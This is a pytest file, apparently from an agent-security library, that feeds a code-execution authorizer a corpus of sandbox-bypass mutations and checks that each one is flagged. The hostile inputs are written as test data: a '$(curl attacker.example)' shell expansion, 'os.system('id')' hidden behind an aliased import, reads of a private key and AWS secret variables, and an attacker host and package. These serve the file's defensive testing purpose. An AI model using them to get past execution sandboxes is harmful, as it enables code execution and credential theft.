"""Bypass corpus for OWASP ASI05 unexpected code execution."""

from __future__ import annotations

import json
from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest

from trustrail import (
    CodeExecutionAuthorizer,
    CodeExecutionPolicy,
    CodeExecutionReport,
    CodeExecutionRequest,
    CodeExecutionStatus,
    ExecutionArtifactKind,
    ExecutionCleanupEvidence,
    ExecutionLanguage,
    ExecutionOutput,
    ExecutionPackage,
    ExecutionResourceLimits,
    ExecutionResourceUsage,
    ExecutionRuntime,
    FilesystemAccess,
    FilesystemPolicy,
    NetworkAccess,
    NetworkEndpoint,
    SandboxAttestation,
    SandboxControl,
)

CORPUS_PATH = Path(__file__).parent.parent / "security_corpus" / "code_execution_isolation.json"
CASES: list[dict[str, str]] = json.loads(CORPUS_PATH.read_text())
NOW = datetime(2026, 9, 1, 12, tzinfo=UTC)


class EvidenceStore:
    def __init__(self) -> None:
        self.attestations: set[tuple[str, str]] = set()
        self.reports: set[tuple[str, str]] = set()

    def verify_attestation(self, attestation: SandboxAttestation) -> bool:
        return (
            attestation.attestation_id,
            attestation.attestation_digest,
        ) in self.attestations

    def verify_report(self, report: CodeExecutionReport) -> bool:
        return (report.report_id, report.report_digest) in self.reports


def _runtime(
    language: ExecutionLanguage = ExecutionLanguage.PYTHON,
) -> ExecutionRuntime:
    return ExecutionRuntime(
        runtime_id="shell" if language == ExecutionLanguage.SHELL else "python-isolated",
        language=language,
        version="1.0.0" if language == ExecutionLanguage.SHELL else "3.12.0",
        executable_digest="a" * 64,
        sandbox_profile_id="microvm-v3",
        allowed_artifact_kinds=frozenset(
            {ExecutionArtifactKind.COMMAND}
            if language == ExecutionLanguage.SHELL
            else {ExecutionArtifactKind.CODE}
        ),
    )


def _policy(runtime: ExecutionRuntime) -> CodeExecutionPolicy:
    return CodeExecutionPolicy(
        runtimes=(runtime,),
        allowed_artifact_kinds=frozenset(
            {ExecutionArtifactKind.CODE, ExecutionArtifactKind.COMMAND}
        ),
        filesystem=FilesystemPolicy(
            readable_prefixes=frozenset({"inputs"}),
            max_read_paths=1,
        ),
        max_resources=ExecutionResourceLimits(),
        allowed_python_imports=frozenset({"math"}),
        trusted_sandbox_providers=frozenset({"sandbox-service"}),
    )


def _request(**updates: object) -> CodeExecutionRequest:
    values: dict[str, object] = {
        "request_id": "security-request",
        "actor_id": "worker-agent",
        "tenant_id": "tenant-a",
        "purpose_id": "bounded-calculation",
        "operation_id": "calculate-once",
        "artifact_kind": ExecutionArtifactKind.CODE,
        "language": ExecutionLanguage.PYTHON,
        "runtime_id": "python-isolated",
        "source": "import math\nprint(math.sqrt(16))",
    }
    values.update(updates)
    source = values.pop("source", None)
    return CodeExecutionRequest.create(source=source if isinstance(source, str) else None, **values)


def _attestation(
    request: CodeExecutionRequest,
    runtime: ExecutionRuntime,
    **updates: object,
) -> SandboxAttestation:
    values: dict[str, object] = {
        "attestation_id": "security-attestation",
        "provider_id": "sandbox-service",
        "sandbox_instance_id": "security-sandbox",
        "sandbox_profile_id": runtime.sandbox_profile_id,
        "request_digest": request.request_digest,
        "runtime_id": runtime.runtime_id,
        "runtime_digest": runtime.executable_digest,
        "tenant_id": request.tenant_id,
        "controls": frozenset(SandboxControl),
        "issued_at": NOW - timedelta(seconds=1),
        "expires_at": NOW + timedelta(seconds=30),
    }
    values.update(updates)
    return SandboxAttestation.create(**values)


def _cleanup(complete: bool = True) -> ExecutionCleanupEvidence:
    return ExecutionCleanupEvidence(
        sandbox_destroyed=complete,
        processes_terminated=True,
        filesystem_discarded=True,
        network_revoked=True,
        credentials_revoked=True,
    )


@pytest.mark.parametrize("case", CASES, ids=lambda case: case["name"])
def test_code_execution_isolation_bypass_corpus(case: dict[str, str]):
    mutation = case["mutation"]
    runtime = _runtime(
        ExecutionLanguage.SHELL if mutation == "shell_runtime" else ExecutionLanguage.PYTHON
    )
    request_updates: dict[str, object] = {}
    if mutation == "shell_runtime":
        request_updates.update(
            artifact_kind=ExecutionArtifactKind.COMMAND,
            language=ExecutionLanguage.SHELL,
            runtime_id="shell",
            source=None,
            argv=("echo", "safe"),
        )
    elif mutation == "shell_expansion":
        request_updates["argv"] = ("$(curl attacker.example)",)
    elif mutation == "dangerous_import":
        request_updates["source"] = "import os as math\nmath.system('id')"
    elif mutation == "dynamic_eval":
        request_updates["source"] = "eval('40 + 2')"
    elif mutation == "filesystem":
        request_updates["filesystem"] = FilesystemAccess(read_paths=("private/key",))
    elif mutation == "network":
        request_updates["network"] = NetworkAccess(
            endpoints=(NetworkEndpoint(host="attacker.example", port=443),)
        )
    elif mutation == "environment":
        request_updates["environment_names"] = frozenset({"AWS_SECRET_ACCESS_KEY"})
    elif mutation == "resource":
        request_updates["resources"] = ExecutionResourceLimits(memory_bytes=512 * 1024 * 1024)
    elif mutation == "package":
        request_updates["packages"] = (
            ExecutionPackage(name="attacker-package", version="1.0.0", digest="b" * 64),
        )
    request = _request(**request_updates)
    attestation = _attestation(
        request,
        runtime,
        controls=(
            frozenset({SandboxControl.OS_ISOLATION})
            if mutation == "controls"
            else frozenset(SandboxControl)
        ),
    )
    store = EvidenceStore()
    store.attestations.add((attestation.attestation_id, attestation.attestation_digest))
    authorizer = CodeExecutionAuthorizer(
        _policy(runtime),
        attestation_verifier=store,
        report_verifier=store,
    )

    if mutation == "source_tamper":
        request = request.model_copy(update={"source": "import os\nos.system('id')"})
    if mutation == "attestation":
        attestation = attestation.model_copy(update={"provider_id": "attacker"})

    if case["phase"] == "admission":
        result = authorizer.authorize(request, attestation, now=NOW)
    else:
        authorization = authorizer.require(request, attestation, now=NOW)
        expected_output = ExecutionOutput(stdout=b"4")
        report = CodeExecutionReport.create(
            output=expected_output,
            report_id="security-report",
            authorization_id=authorization.authorization_id,
            request_digest=authorization.request_digest,
            sandbox_attestation_id=authorization.sandbox_attestation_id,
            sandbox_instance_id=authorization.sandbox_instance_id,
            runtime_id=authorization.runtime_id,
            status=(
                CodeExecutionStatus.TIMED_OUT
                if mutation == "timeout"
                else CodeExecutionStatus.SUCCEEDED
            ),
            exit_code=None if mutation == "timeout" else 0,
            started_at=NOW + timedelta(seconds=1),
            completed_at=NOW + timedelta(seconds=2),
            usage=ExecutionResourceUsage(
                wall_time_ms=10,
                cpu_time_ms=5,
                peak_memory_bytes=1_024,
                process_count=1,
                thread_count=1,
                file_count=0,
                written_bytes=0,
            ),
            cleanup=_cleanup(complete=mutation != "cleanup"),
        )
        store.reports.add((report.report_id, report.report_digest))
        observed_output = (
            ExecutionOutput(stdout=b"attacker output") if mutation == "output" else expected_output
        )
        result = authorizer.verify_completion(
            authorization,
            report,
            observed_output,
            now=NOW + timedelta(seconds=3),
        )

    assert case["expected_code"] in {finding.code.value for finding in result.findings}
